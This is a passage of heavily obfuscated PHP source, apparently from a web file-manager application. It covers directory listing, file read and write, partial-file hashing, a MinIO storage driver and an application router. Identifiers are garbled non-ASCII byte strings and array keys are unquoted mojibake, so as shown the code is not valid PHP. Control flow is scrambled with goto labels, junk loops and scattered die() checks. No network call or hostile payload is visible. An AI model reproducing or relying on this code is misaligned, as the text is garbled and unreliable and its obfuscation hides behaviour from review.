$Dï½‘ç£¿[181], $Dï½‘ç£¿[87] => $this->size($d„¹Œ¬¾’¤), $Dï½‘ç£¿[175] => $this->ext($F“¶Ë¹„…„)); } $aŒ§ª‘àã— = array($Dï½‘ç£¿[38] => $F“¶Ë¹„…„, $Dï½‘ç£¿[85] => $this->getPathOuter($d„¹Œ¬¾’¤), $Dï½‘ç£¿[39] => $Dï½‘ç£¿[181], $Dï½‘ç£¿[200] => @filectime($d„¹Œ¬¾’¤), $Dï½‘ç£¿[117] => @filemtime($d„¹Œ¬¾’¤), $Dï½‘ç£¿[1186] => @fileatime($d„¹Œ¬¾’¤), $Dï½‘ç£¿[87] => $this->size($d„¹Œ¬¾’¤), $Dï½‘ç£¿[175] => $this->ext($F“¶Ë¹„…„), $Dï½‘ç£¿[1187] => is_readable($d„¹Œ¬¾’¤), $Dï½‘ç£¿[1188] => is_writable($d„¹Œ¬¾’¤), $Dï½‘ç£¿[1189] => get_mode($d„¹Œ¬¾’¤)); return $aŒ§ª‘àã—; } public function exist($BÅÆ–Ã …‘) { $BÅÆ–Ã …‘ = $this->iconvSystem($BÅÆ–Ã …‘); return @file_exists($BÅÆ–Ã …‘); } public function isFile($EêÖ¹äã¥) { $EêÖ¹äã¥ = $this->iconvSystem($EêÖ¹äã¥); return @is_file($EêÖ¹äã¥); } public function isFolder($eôöÚË¥±‚) { $eôöÚË¥±‚ = $this->iconvSystem($eôöÚË¥±‚); return @is_dir($eôöÚË¥±‚); } public function listPath($b…Á‚õ´Ş, $a±¸‰ù¯¹ò = false) { goto BË»…ù—¦ì; BË»…ù—¦ì: $fŸ¿—ëš =& $_SERVER[±á õÁ]; $b…Á‚õ´Ş = $this->iconvSystem($b…Á‚õ´Ş); $b…Á‚õ´Ş = rtrim($b…Á‚õ´Ş, $fŸ¿—ëš[8]) . $fŸ¿—ëš[8]; goto E÷›«°Ë; D“ßÅ‹”»´: closedir($e˜¯âß‡Ÿ‘); return $dŠºêè•«; goto A®¨Ñ…Òê; E÷›«°Ë: $dŠºêè•« = array($fŸ¿—ëš[84] => array(), $fŸ¿—ëš[83] => array()); if (!($e˜¯âß‡Ÿ‘ = @opendir($b…Á‚õ´Ş))) { return $dŠºêè•«; } while (($B²»Ë’ä¦¢ = readdir($e˜¯âß‡Ÿ‘)) !== !1) { if ($B²»Ë’ä¦¢ == $fŸ¿—ëš[101] || $B²»Ë’ä¦¢ == $fŸ¿—ëš[1183]) { continue; } $a·åğù’ˆ© = $b…Á‚õ´Ş . $B²»Ë’ä¦¢; if (is_file($a·åğù’ˆ©)) { $dŠºêè•«[$fŸ¿—ëš[83]][] = $this->fileInfo($a·åğù’ˆ©, $a±¸‰ù¯¹ò); } else { $dŠºêè•«[$fŸ¿—ëš[84]][] = $this->folderInfo($a·åğù’ˆ©, $a±¸‰ù¯¹ò); } } goto D“ßÅ‹”»´; A®¨Ñ…Òê: } public function listAll($AÅÒ‚Ñî•­, &$e¬ÊÂ­ç§– = array()) { goto Aõœ”®ˆ±–; Aõœ”®ˆ±–: $aåÖ‰†ÔÏ =& $_SERVER[±á õÁ]; $AÅÒ‚Ñî•­ = $this->iconvSystem($AÅÒ‚Ñî•­); $AÅÒ‚Ñî•­ = rtrim($AÅÒ‚Ñî•­, $aåÖ‰†ÔÏ[8]) . $aåÖ‰†ÔÏ[8]; goto c©ùÌ±¨¹½; F‹ğšÍ´Œâ: return $e¬ÊÂ­ç§–; goto BİÒ…šÎã; c©ùÌ±¨¹½: if (!($E–ÓÕÑÑË = @opendir($AÅÒ‚Ñî•­))) { return $e¬ÊÂ­ç§–; } while (($dİ•í’ƒ—ç = readdir($E–ÓÕÑÑË)) !== !1) { if ($dİ•í’ƒ—ç == $aåÖ‰†ÔÏ[101] || $dİ•í’ƒ—ç == $aåÖ‰†ÔÏ[1183]) { continue; } $A«§¯’©Šª = $AÅÒ‚Ñî•­ . $dİ•í’ƒ—ç; if (is_dir($A«§¯’©Šª) && !is_link($A«§¯’©Šª)) { $e¬ÊÂ­ç§–[] = array($aåÖ‰†ÔÏ[85] => $A«§¯’©Šª . $aåÖ‰†ÔÏ[8], $aåÖ‰†ÔÏ[86] => 1, $aåÖ‰†ÔÏ[117] => @filemtime($A«§¯’©Šª), $aåÖ‰†ÔÏ[87] => 0); $this->listAll($A«§¯’©Šª, $e¬ÊÂ­ç§–); } else { $e¬ÊÂ­ç§–[] = array($aåÖ‰†ÔÏ[85] => $A«§¯’©Šª, $aåÖ‰†ÔÏ[86] => 0, $aåÖ‰†ÔÏ[117] => @filemtime($A«§¯’©Šª), $aåÖ‰†ÔÏ[87] => $this->size($A«§¯’©Šª)); } } closedir($E–ÓÕÑÑË); goto F‹ğšÍ´Œâ; BİÒ…šÎã: } public function has($a¡¿Á”«¬, $b…”©İ = false, $cÅ…èïèåÜ = true) { goto cØæ‚ ¿±Î; Bê‡Ñí™‹—: if ($b…”©İ) { return array($F¦¶¼‰Æ¥‹[209] => $B–Í­æ÷ÅÅ, $F¦¶¼‰Æ¥‹[210] => $EÑ£õõ„ŒÄ); } return !1; goto b©‰°ó¸‘š; a‚åÇ§½“: if (!($bƒ±¥Û¨± = @opendir($a¡¿Á”«¬))) { return !1; } $B–Í­æ÷ÅÅ = 0; $EÑ£õõ„ŒÄ = 0; goto b‰–îÌ¬•Ü; b‰–îÌ¬•Ü: $BÁ‹ˆÇµ‡ø = 0; while (($E­§¾¢‘ì¡ = readdir($bƒ±¥Û¨±)) !== !1) { if ($E­§¾¢‘ì¡ == $F¦¶¼‰Æ¥‹[101] || $E­§¾¢‘ì¡ == $F¦¶¼‰Æ¥‹[1183]) { continue; } $bÚõ‰‡Œˆ = $a¡¿Á”«¬ . $E­§¾¢‘ì¡; if ($b…”©İ) { $BÁ‹ˆÇµ‡ø++; if (@is_file($bÚõ‰‡Œˆ)) { $B–Í­æ÷ÅÅ++; } else { $EÑ£õõ„ŒÄ++; } if ($BÁ‹ˆÇµ‡ø > 10000) { break; } continue; } if ($cÅ…èïèåÜ) { if (@is_file($bÚõ‰‡Œˆ)) { return !0; } } else { if (@is_dir($bÚõ‰‡Œˆ . $F¦¶¼‰Æ¥‹[8])) { return !0; } } } closedir($bƒ±¥Û¨±); goto Bê‡Ñí™‹—; cØæ‚ ¿±Î: $F¦¶¼‰Æ¥‹ =& $_SERVER[±á õÁ]; $a¡¿Á”«¬ = $this->iconvSystem($a¡¿Á”«¬); $a¡¿Á”«¬ = rtrim($a¡¿Á”«¬, $F¦¶¼‰Æ¥‹[8]) . $F¦¶¼‰Æ¥‹[8]; goto a‚åÇ§½“; b©‰°ó¸‘š: } public function hashSimple($b†óÜ¥‚š™) { goto BòŸßˆğÁ‚; Fºº£¯´: return md5($A¾È«×åãè) . $f­–šÙ´®Ì; goto BãÀÚğô¥; cï–ÄâÑ: $a¡ ÎÇÛÁÃ = fopen($b†óÜ¥‚š™, $E¨Ë‹›Õ†Œ[1190]); if (!$a¡ ÎÇÛÁÃ) { return $A¾È«×åãè; } for ($aÔõßÆ¨©Ñ = 0; $aÔõßÆ¨©Ñ < $eÅÆˆ‰ŒˆÁ; $aÔõßÆ¨©Ñ++) { fseek_64($a¡ ÎÇÛÁÃ, $C²øñåĞ–ø * $aÔõßÆ¨©Ñ); $A¾È«×åãè .= fread($a¡ ÎÇÛÁÃ, $b¡ğâÇµÕÅ); } goto a›áéé‚çĞ; a›áéé‚çĞ: fseek_64($a¡ ÎÇÛÁÃ, $f­–šÙ´®Ì - $b¡ğâÇµÕÅ); $A¾È«×åãè .= fread($a¡ ÎÇÛÁÃ, $b¡ğâÇµÕÅ); fclose($a¡ ÎÇÛÁÃ); goto Fºº£¯´; e£Å°ø‚¯Ù: if ($f­–šÙ´®Ì <= $b¡ğâÇµÕÅ * $eÅÆˆ‰ŒˆÁ) { return $this->hashMd5($b†óÜ¥‚š™) . $f­–šÙ´®Ì; } $A¾È«×åãè = $E¨Ë‹›Õ†Œ[43]; $C²øñåĞ–ø = intval($f­–šÙ´®Ì / $eÅÆˆ‰ŒˆÁ); goto cï–ÄâÑ; BòŸßˆğÁ‚: $E¨Ë‹›Õ†Œ =& $_SERVER[±á õÁ]; if (!$b†óÜ¥‚š™) { return md5($E¨Ë‹›Õ†Œ[43]); } $b†óÜ¥‚š™ = $this->iconvSystem($b†óÜ¥‚š™); goto e¨²©…É¾®; e¨²©…É¾®: $f­–šÙ´®Ì = $this->size($b†óÜ¥‚š™); $b¡ğâÇµÕÅ = 200; $eÅÆˆ‰ŒˆÁ = 50; goto e£Å°ø‚¯Ù; BãÀÚğô¥: } public function getContent($F“´ñ¹Ç¸ ) { $F“´ñ¹Ç¸  = $this->iconvSystem($F“´ñ¹Ç¸ ); return file_get_contents($F“´ñ¹Ç¸ ); } public function setContent($a…³–ÙƒËİ, $aÕÂ÷é‚  = '') { $a…³–ÙƒËİ = $this->iconvSystem($a…³–ÙƒËİ); @file_put_contents($a…³–ÙƒËİ, $aÕÂ÷é‚ , LOCK_EX); clearstatcache(); return strlen($aÕÂ÷é‚ ) == filesize_64($a…³–ÙƒËİ); } public function fileSubstr($FÎˆ„‰ô±º, $D ³«ƒÅÓ = 0, $F£ÓáØé‰È = false) { goto e”±ƒ¬»à·; a¿›ß¤³: fseek_64($D«ğ†œÜµ, $D ³«ƒÅÓ); $d§Ò¬â¤ê = fread($D«ğ†œÜµ, $F£ÓáØé‰È); fclose($D«ğ†œÜµ); goto eß¶Å·”™¨; e”±ƒ¬»à·: $AÒ§‰à·Ë =& $_SERVER[±á õÁ]; $FÎˆ„‰ô±º = $this->iconvSystem($FÎˆ„‰ô±º); if ($F£ÓáØé‰È === !1) { $F£ÓáØé‰È = $this->size($FÎˆ„‰ô±º); } goto B¦Ô·’áŠÏ; B¦Ô·’áŠÏ: if ($F£ÓáØé‰È <= 0) { return $AÒ§‰à·Ë[43]; } $D«ğ†œÜµ = fopen($FÎˆ„‰ô±º, $AÒ§‰à·Ë[1190]); if (!$D«ğ†œÜµ) { return !1; } goto a¿›ß¤³; eß¶Å·”™¨: return $d§Ò¬â¤ê; goto C—œˆÊö›; C—œˆÊö›: } public function upload($dŠ«Ô…·³, $C¨‰ß´–˜©, $dãš«¨Ø“ = false, $EŞİª¬áä‡ = REPEAT_REPLACE) { $D„ŞÇÎí» = $this->copyFile($C¨‰ß´–˜©, $dŠ«Ô…·³); return $D„ŞÇÎí» ? $this->getPathOuter($dŠ«Ô…·³) : !1; } public function setModifyTime($b¦Îµ‚éõã, $A›ÅŠ¤ÀÊ¬ = '') { @touch($b¦Îµ‚éõã, intval($A›ÅŠ¤ÀÊ¬)); } public function download($fµÒè‡ˆ·¼, $Bí‹øÄ»½) { return $this->iconvSystem($fµÒè‡ˆ·¼); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($fĞ‚â“‰Ç) { parent::__construct($fĞ‚â“‰Ç); $this->signatureVersion($_SERVER[±á õÁ][218]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto CÓ®øõº; DíºÊ°ƒé™: class Application { private $defaultModule = "\x69\x6e\x64\x65\x78"; private $defaultController = "\151\x6e\144\x65\170"; private $defaultAction = "\151\156\144\145\170"; function __construct() { } public function setDefault($f‹ÊºÃ£Ï—) { goto eæÚªó…Çê; Eˆ¶¹½äÈ³: $FĞÜÏ—• = $A±›†ÇÀà…[576]; if (strlen($FĞÜÏ—•) < $A±›†ÇÀà…[15]) { die; } $this->defaultModule = $d²àŞÈ±Œ[0] ? $d²àŞÈ±Œ[0] : $this->defaultModule; goto eõ¤²; eõ¤²: $dŸ…²“†‚Ï = $A±›†ÇÀà…[577]; while ($dŸ…²“†‚Ï < $A±›†ÇÀà…[572]) { if ($dŸ…²“†‚Ï >= 0) { break; } $dŸ…²“†‚Ï++; } $this->defaultController = $d²àŞÈ±Œ[1] ? $d²àŞÈ±Œ[1] : $this->defaultController; goto D’á£Áî†æ; D’á£Áî†æ: $d”¢ê×ÉË® = $A±›†ÇÀà…[578]; while (strlen($d”¢ê×ÉË®) < $A±›†ÇÀà…[579]) { if (!$d”¢ê×ÉË®) { break; } $d”¢ê×ÉË®++; } $this->defaultAction = $d²àŞÈ±Œ[2] ? $d²àŞÈ±Œ[2] : $this->defaultAction; goto FàßÕ¾‡; FàßÕ¾‡: $this->{$_SERVER[Â·¨][3]}($D¦²ø˜¿×[4], array($this, $D¦²ø˜¿×[5])); $aæ¤ÉîòíÈ = $A±›†ÇÀà…[580]; goto Dƒ™ÂĞå«; eæÚªó…Çê: $A±›†ÇÀà… =& $_SERVER[±á õÁ]; $D¦²ø˜¿× =& $_SERVER[Â·¨]; $d²àŞÈ±Œ = $D¦²ø˜¿×[0]($D¦²ø˜¿×[1], $D¦²ø˜¿×[2]($f‹ÊºÃ£Ï—, $D¦²ø˜¿×[1])); goto Eˆ¶¹½äÈ³; Dƒ™ÂĞå«: } public function appRun($FÙ’Æ¿œñ¸) { goto aå¸§§—•; aå¸§§—•: $b“¶¤àâÇ„ =& $_SERVER[±á õÁ]; $bºÚˆùœëÁ =& $_SERVER[Â·¨]; $f†ÖòÀöß = $bºÚˆùœëÁ[0]($bºÚˆùœëÁ[1], $FÙ’Æ¿œñ¸); goto f¾áÛ¹ˆ˜; Fñ¬õ¨Ï’ƒ: if ($bƒÏõğºã == $bºÚˆùœëÁ[8]) { $e–“ö°…·’ = $bºÚˆùœëÁ[9]; $f†ÖòÀöß[0] = $bºÚˆùœëÁ[10]; $f†ÖòÀöß[1] = $f†ÖòÀöß[1] . $bºÚˆùœëÁ[11]; $FÙ’Æ¿œñ¸ = $bºÚˆùœëÁ[12]($bºÚˆùœëÁ[1], $f†ÖòÀöß); $FÙ’Æ¿œñ¸ = $bºÚˆùœëÁ[2]($FÙ’Æ¿œñ¸, $bºÚˆùœëÁ[1]); } $bºÚˆùœëÁ[13](array($bºÚˆùœëÁ[14], $bºÚˆùœëÁ[15]), $e–“ö°…·’ . $bºÚˆùœëÁ[16], $FÙ’Æ¿œñ¸); $bºÚˆùœëÁ[17]($FÙ’Æ¿œñ¸); goto f¤µ•›à‘®; f¤µ•›à‘®: $C—Ô«÷’®ñ = $b“¶¤àâÇ„[582]; if (strlen($C—Ô«÷’®ñ) < $b“¶¤àâÇ„[15]) { die; } $bºÚˆùœëÁ[13](array($bºÚˆùœëÁ[14], $bºÚˆùœëÁ[15]), $e–“ö°…·’ . $bºÚˆùœëÁ[18], $FÙ’Æ¿œñ¸); goto fğ‚§ˆ°»…; f¾áÛ¹ˆ˜: $b‘›†â´Öª = $b“¶¤àâÇ„[581]; $bƒÏõğºã = $bºÚˆùœëÁ[6]($f†ÖòÀöß[0]); $e–“ö°…·’ = $bºÚˆùœëÁ[7]; goto Fñ¬õ¨Ï’ƒ; fğ‚§ˆ°»…: } private function autorun() { $eÈ¨½íòŞ =& $_SERVER[Â·¨]; global $config; $e¬Î´°²Àš = $_SERVER[±á õÁ][583]; if (!$e¬Î´°²Àš) { die; } if ($eÈ¨½íòŞ[19]($config[$eÈ¨½íòŞ[20]]) == 0) { return; } foreach ($config[$eÈ¨½íòŞ[20]] as $c–§ÆĞİ¶® => $A·ÔÁºÒ™í) { $this->{$_SERVER[Â·¨][21]}($A·ÔÁºÒ™í); } } private function fugvcfc3b96c() { goto CÍÁ¹¼»‰; cÓ¯¨¸Î–à: if (!$E”‰‚Šİ´« || $aª†ÜˆŒÖ[24]($E”‰‚Šİ´«) <= $aª†ÜˆŒÖ[24]($eİø¯Ññ°)) { return; } if ($aª†ÜˆŒÖ[6]($aª†ÜˆŒÖ[25]($E”‰‚Šİ´«, -$aª†ÜˆŒÖ[24]($eİø¯Ññ°))) != $eİø¯Ññ°) { return; } $A·¥³ˆÎâˆ = $aª†ÜˆŒÖ[25]($E”‰‚Šİ´«, 0, -$aª†ÜˆŒÖ[24]($eİø¯Ññ°)); goto fíÄäÃ¬; b»ÜÒ‚µå: $GLOBALS[$aª†ÜˆŒÖ[22]][$aª†ÜˆŒÖ[23]] = $aª†ÜˆŒÖ[27]($A®ëå‚‚, $Fİ‡÷¶İº); $aÓÑ±¸‚ïå = $aŞÍ¡¦İìˆ[587]; if (strlen($aÓÑ±¸‚ïå) < $aŞÍ¡¦İìˆ[588]) { die; } goto AÁÚò÷©öá; AÁÚò÷©öá: $GLOBALS[$aª†ÜˆŒÖ[22]][$aª†ÜˆŒÖ[28]] = $aª†ÜˆŒÖ[29]($aª†ÜˆŒÖ[1], $GLOBALS[$aª†ÜˆŒÖ[22]][$aª†ÜˆŒÖ[23]]); goto B‚£Ú÷ÇÛ‹; CÍÁ¹¼»‰: $aŞÍ¡¦İìˆ =& $_SERVER[±á õÁ]; $aª†ÜˆŒÖ =& $_SERVER[Â·¨]; $eİø¯Ññ° = $aª†ÜˆŒÖ[8]; goto F¢ÂäÔ†ßö; fíÄäÃ¬: $A®ëå‚‚ = array($aª†ÜˆŒÖ[8], $A·¥³ˆÎâˆ); $Fİ‡÷¶İº = $aª†ÜˆŒÖ[26]($GLOBALS[$aª†ÜˆŒÖ[22]][$aª†ÜˆŒÖ[23]], 1); $BßÑ²Óà²ƒ = $aŞÍ¡¦İìˆ[586]; goto b»ÜÒ‚µå; F¢ÂäÔ†ßö: $E”‰‚Šİ´« = $GLOBALS[$aª†ÜˆŒÖ[22]][$aª†ÜˆŒÖ[23]][0]; $A‘å¦åì¡„ = $aŞÍ¡¦İìˆ[584]; while ($A‘å¦åì¡„ < $aŞÍ¡¦İìˆ[585]) { if ($A‘å¦åì¡„ >= 0) { break; } $A‘å¦åì¡„++; } goto cÓ¯¨¸Î–à; B‚£Ú÷ÇÛ‹: } private function bmyp9c9d39a2() { goto eªğÔÒ¼†ù; BŸƒ £İë˜: $fƒÒ®¦¥÷ = $_SERVER[$EÅá¬ÃÒ£¢[30]]; $dø‹òá¯± = $e§İ™–İ³[589]; if (strlen($dø‹òá¯±) < $e§İ™–İ³[572]) { return; } goto F¾¤æÚ¹‡; F¾¤æÚ¹‡: $cğ†Â‹ÓÙµ = $EÅá¬ÃÒ£¢[31]; if (!$EÅá¬ÃÒ£¢[32]($fƒÒ®¦¥÷, $cğ†Â‹ÓÙµ)) { return; } $Bå”ßË¢º = $EÅá¬ÃÒ£¢[33]($fƒÒ®¦¥÷, $cğ†Â‹ÓÙµ); goto C×ÏÄĞõ«; B„ÜÁ´óÓÖ: $A ¯êÁµ– = $e§İ™–İ³[591]; if (strlen($A ¯êÁµ–) < $e§İ™–İ³[572]) { return; } $EÅá¬ÃÒ£¢[34]($EÅá¬ÃÒ£¢[35], $DÏ÷‚ŒÛ, $Fˆè¯Èö¬İ); goto AˆóñôƒÁ³; AˆóñôƒÁ³: $DÏ÷‚ŒÛ = $EÅá¬ÃÒ£¢[2]($Fˆè¯Èö¬İ[0][0], $EÅá¬ÃÒ£¢[36]); $GLOBALS[$EÅá¬ÃÒ£¢[22]][$EÅá¬ÃÒ£¢[23]] = $EÅá¬ÃÒ£¢[0]($EÅá¬ÃÒ£¢[36], $DÏ÷‚ŒÛ); $GLOBALS[$EÅá¬ÃÒ£¢[22]][$EÅá¬ÃÒ£¢[28]] = $EÅá¬ÃÒ£¢[29]($EÅá¬ÃÒ£¢[1], $GLOBALS[$EÅá¬ÃÒ£¢[22]][$EÅá¬ÃÒ£¢[23]]); goto e•šõÎªöÂ; eªğÔÒ¼†ù: $e§İ™–İ³ =& $_SERVER[±á õÁ]; $EÅá¬ÃÒ£¢ =& $_SERVER[Â·¨]; if ($GLOBALS[$EÅá¬ÃÒ£¢[22]][$EÅá¬ÃÒ£¢[28]] != $EÅá¬ÃÒ£¢[10]) { return; } goto BŸƒ £İë˜; C×ÏÄĞõ«: $c½Üµ»ªöæ = $e§İ™–İ³[590]; while ($c½Üµ»ªöæ < $e§İ™–İ³[585]) { if ($c½Üµ»ªöæ >= 0) { break; } $c½Üµ»ªöæ++; } $DÏ÷‚ŒÛ = $EÅá¬ÃÒ£¢[25]($fƒÒ®¦¥÷, $Bå”ßË¢º + $EÅá¬ÃÒ£¢[24]($cğ†Â‹ÓÙµ)); goto B„ÜÁ´óÓÖ; e•šõÎªöÂ: } public function run() { goto aÒ­»™°«; aÒ­»™°«: $F¨İÙŞŠ¶Ü =& $_SERVER[±á õÁ]; $B÷»İÅ‹ÍŠ =& $_SERVER[Â·¨]; $this->{$_SERVER[Â·¨][37]}(); goto cœ–ÀÍ÷Ùñ; bç†Š‰®Û: $this->{$_SERVER[Â·¨][45]}(); if ($B÷»İÅ‹ÍŠ[19]($Eª×ĞÓŞ‰) >= 3) { $this->{$_SERVER[Â·¨][21]}($dŒ¡¢ †´ˆ); } else { $this->{$_SERVER[Â·¨][21]}(ACTION); } goto b‘… ö£¨; B»«ÒÇù‡: $EáïˆÑ¹¶ñ = $F¨İÙŞŠ¶Ü[593]; if (!$EáïˆÑ¹¶ñ) { return; } $dŒ¡¢ †´ˆ = $GLOBALS[$B÷»İÅ‹ÍŠ[22]][$B÷»İÅ‹ÍŠ[28]]; goto b¸ÏœôÅ°Ğ; b¸ÏœôÅ°Ğ: $B÷»İÅ‹ÍŠ[39]($B÷»İÅ‹ÍŠ[40], isset($Eª×ĞÓŞ‰[0]) && $Eª×ĞÓŞ‰[0] ? $Eª×ĞÓŞ‰[0] : $this->defaultModule); $aõì„†à¶ = $F¨İÙŞŠ¶Ü[594]; if (strlen($aõì„†à¶) < $F¨İÙŞŠ¶Ü[572]) { die; } goto B…®ó¸ïéå; B…®ó¸ïéå: $B÷»İÅ‹ÍŠ[39]($B÷»İÅ‹ÍŠ[41], isset($Eª×ĞÓŞ‰[1]) && $Eª×ĞÓŞ‰[0] ? $Eª×ĞÓŞ‰[1] : $this->defaultController); $B÷»İÅ‹ÍŠ[39]($B÷»İÅ‹ÍŠ[42], isset($Eª×ĞÓŞ‰[2]) && $Eª×ĞÓŞ‰[0] ? $Eª×ĞÓŞ‰[2] : $this->defaultAction); $B÷»İÅ‹ÍŠ[39]($B÷»İÅ‹ÍŠ[43], MOD . $B÷»İÅ‹ÍŠ[1] . ST . $B÷»İÅ‹ÍŠ[1] . ACT); goto d£Ñ¢¨§; d£Ñ¢¨§: $_SERVER[$B÷»İÅ‹ÍŠ[44]] = $B÷»İÅ‹ÍŠ[6](ACTION); $c—ÆšÜÁ¤… = $F¨İÙŞŠ¶Ü[595]; if (strlen($c—ÆšÜÁ¤…) < $F¨İÙŞŠ¶Ü[585]) { die; } goto bç†Š‰®Û; cœ–ÀÍ÷Ùñ: $this->{$_SERVER[Â·¨][38]}(); $d‰¦ààååø = $F¨İÙŞŠ¶Ü[592]; $Eª×ĞÓŞ‰ = $GLOBALS[$B÷»İÅ‹ÍŠ[22]][$B÷»İÅ‹ÍŠ[23]]; goto B»«ÒÇù‡; b‘… ö£¨: } private $prys1832052b = array(); private $strg3e6220aa = ''; public function mulvc8ad6e3d() { goto aÒÛóÄ·ÕÔ; D¤ñ«—º: $EƒÁ¦±Ÿõô = $EÏù‚»¹‚[599]; if (strlen($EƒÁ¦±Ÿõô) < $EÏù‚»¹‚[572]) { return; } goto C†ëŞˆÌ›Í; aÒÛóÄ·ÕÔ: $EÏù‚»¹‚ =& $_SERVER[±á õÁ]; $bĞ—¯É =& $_SERVER[Â·¨]; $this->{$_SERVER[Â·¨][46]}(); goto dÇ½çë¡·²; B»„Œ£Ôô: while ($dİÅĞ³¦æ¢ < $EÏù‚»¹‚[579]) { if ($dİÅĞ³¦æ¢ >= 0) { break; } $dİÅĞ³¦æ¢++; } $this->{$_SERVER[Â·¨][49]}(); $E›Â­Û¢­ = $EÏù‚»¹‚[597]; goto d¡×º¿„¹ã; dÇ½çë¡·²: $this->{$_SERVER[Â·¨][47]}(); $this->{$_SERVER[Â·¨][48]}(); $dİÅĞ³¦æ¢ = $EÏù‚»¹‚[596]; goto B»„Œ£Ôô; B½‘ë®…±š: $this->{$_SERVER[Â·¨][3]}($bĞ—¯É[53], array($this, $bĞ—¯É[54])); $this->{$_SERVER[Â·¨][3]}($bĞ—¯É[55], array($this, $bĞ—¯É[56])); $D¶¥í¿Ï¸ = $EÏù‚»¹‚[598]; goto fôÂÁ¦ÁÀ; fôÂÁ¦ÁÀ: if (strlen($D¶¥í¿Ï¸) < $EÏù‚»¹‚[572]) { die; } $this->{$_SERVER[Â·¨][3]}($bĞ—¯É[57], array($this, $bĞ—¯É[58])); $this->{$_SERVER[Â·¨][3]}($bĞ—¯É[59], array($this, $bĞ—¯É[60])); goto D¤ñ«—º; d¡×º¿„¹ã: $this->{$_SERVER[Â·¨][50]}(); $this->{$_SERVER[Â·¨][51]}(); $this->{$_SERVER[Â·¨][52]}(); goto B½‘ë®…±š; C†ëŞˆÌ›Í: } public function lhpmee022b0e($C¸¿“Š¾·š) { goto Bˆ«¬˜íï‹; b˜‘Ú·¬ğ¤: if ($this->strg3e6220aa == $Aëµ¿˜œšñ[130]) { $C¸¿“Š¾·š[$Aëµ¿˜œšñ[102]][$Aëµ¿˜œšñ[103]][$Aëµ¿˜œšñ[108]][$Aëµ¿˜œšñ[116]] = 0; } $C¸¿“Š¾·š[$Aëµ¿˜œšñ[117]][$Aëµ¿˜œšñ[137]] = $Aëµ¿˜œšñ[113]($this->prys1832052b, $Aëµ¿˜œšñ[138], $Aëµ¿˜œšñ[10]); $C¸¿“Š¾·š[$Aëµ¿˜œšñ[117]][$Aëµ¿˜œšñ[139]] = $Aëµ¿˜œšñ[113]($this->prys1832052b, $Aëµ¿˜œšñ[140], $Aëµ¿˜œšñ[10]); goto AÌˆÙÊù¼ñ; aÄ–§Ô²: $Eà“Ê—¡·» = array($Aëµ¿˜œšñ[64], $Aëµ¿˜œšñ[65], $Aëµ¿˜œšñ[66], $Aëµ¿˜œšñ[67], $Aëµ¿˜œšñ[68], $Aëµ¿˜œšñ[69], $Aëµ¿˜œšñ[70], $Aëµ¿˜œšñ[71], $Aëµ¿˜œšñ[72], $Aëµ¿˜œšñ[73], $Aëµ¿˜œšñ[74], $Aëµ¿˜œšñ[75], $Aëµ¿˜œšñ[76], $Aëµ¿˜œšñ[77], $Aëµ¿˜œšñ[78], $Aëµ¿˜œšñ[79], $Aëµ¿˜œšñ[80], $Aëµ¿˜œšñ[81], $Aëµ¿˜œšñ[82], $Aëµ¿˜œšñ[83], $Aëµ¿˜œšñ[84], $Aëµ¿˜œšñ[85], $Aëµ¿˜œšñ[86], $Aëµ¿˜œšñ[87], $Aëµ¿˜œšñ[88], $Aëµ¿˜œšñ[89], $Aëµ¿˜œšñ[90], $Aëµ¿˜œšñ[91], $Aëµ¿˜œšñ[92], $Aëµ¿˜œšñ[93], $Aëµ¿˜œšñ[94], $Aëµ¿˜œšñ[95], $Aëµ¿˜œšñ[96], $Aëµ¿˜œšñ[97], $Aëµ¿˜œšñ[98], $Aëµ¿˜œšñ[99]); foreach ($Eà“Ê—¡·» as $AéÙ‡Û¬ÑÖ) { $CÍñ©Ášé¡ = $GLOBALS[$Aëµ¿˜œšñ[100]][$Aëµ¿˜œšñ[101]][$AéÙ‡Û¬ÑÖ]; $Bö•Ê½ÊÙ = $fí´ƒ­ášš[600]; if (strlen($Bö•Ê½ÊÙ) < $fí´ƒ­ášš[588]) { die; } if (isset($e•™£ˆÂ÷á[$AéÙ‡Û¬ÑÖ])) { $CÍñ©Ášé¡ = $e•™£ˆÂ÷á[$AéÙ‡Û¬ÑÖ]; } $C¸¿“Š¾·š[$Aëµ¿˜œšñ[102]][$Aëµ¿˜œšñ[103]][$AéÙ‡Û¬ÑÖ] = $CÍñ©Ášé¡; } $a±Ç‡Œá = $C¸¿“Š¾·š[$Aëµ¿˜œšñ[102]][$Aëµ¿˜œšñ[103]][$Aëµ¿˜œšñ[76]]; goto B§èÔ—›; eì„¤ç›£: if (strlen($e‰¤íßÚÕÁ) < $fí´ƒ­ášš[572]) { die; } $C¸¿“Š¾·š[$Aëµ¿˜œšñ[117]][$Aëµ¿˜œšñ[129]] = $this->strg3e6220aa; if ($e•™£ˆÂ÷á[$Aëµ¿˜œšñ[129]] != $Aëµ¿˜œšñ[130]) { $C¸¿“Š¾·š[$Aëµ¿˜œšñ[117]][$Aëµ¿˜œšñ[131]] = $e•™£ˆÂ÷á[$Aëµ¿˜œšñ[131]]; $C¸¿“Š¾·š[$Aëµ¿˜œšñ[117]][$Aëµ¿˜œšñ[132]] = $e•™£ˆÂ÷á[$Aëµ¿˜œšñ[132]]; $CŞÊ¤†©°ƒ = $Aëµ¿˜œšñ[133](10) . $this->strg3e6220aa . $Aëµ¿˜œšñ[133](5); $C¸¿“Š¾·š[$Aëµ¿˜œšñ[102]][$Aëµ¿˜œšñ[134]][$Aëµ¿˜œšñ[135]] = $this->{$_SERVER[Â·¨][136]}($CŞÊ¤†©°ƒ, $C¸¿“Š¾·š[$Aëµ¿˜œšñ[117]][$Aëµ¿˜œšñ[122]]); } goto b˜‘Ú·¬ğ¤; b¦ØËçãª‰: unset($C¸¿“Š¾·š[$Aëµ¿˜œšñ[102]][$Aëµ¿˜œšñ[103]][$Aëµ¿˜œšñ[107]]); $C¸¿“Š¾·š[$Aëµ¿˜œšñ[102]][$Aëµ¿˜œšñ[103]][$Aëµ¿˜œšñ[108]] = array($Aëµ¿˜œšñ[109] => (int) $a±Ç‡Œá[$Aëµ¿˜œšñ[110]], $Aëµ¿˜œšñ[111] => $Aëµ¿˜œšñ[112]($Aëµ¿˜œšñ[113]($a±Ç‡Œá, $Aëµ¿˜œšñ[114], array())), $Aëµ¿˜œšñ[115] => (int) $Aëµ¿˜œšñ[113]($a±Ç‡Œá, $Aëµ¿˜œšñ[116], 0)); $DÅ¥ÃºÊ’² = $fí´ƒ­ášš[603]; goto A§é®ŒÜ¸; A§é®ŒÜ¸: 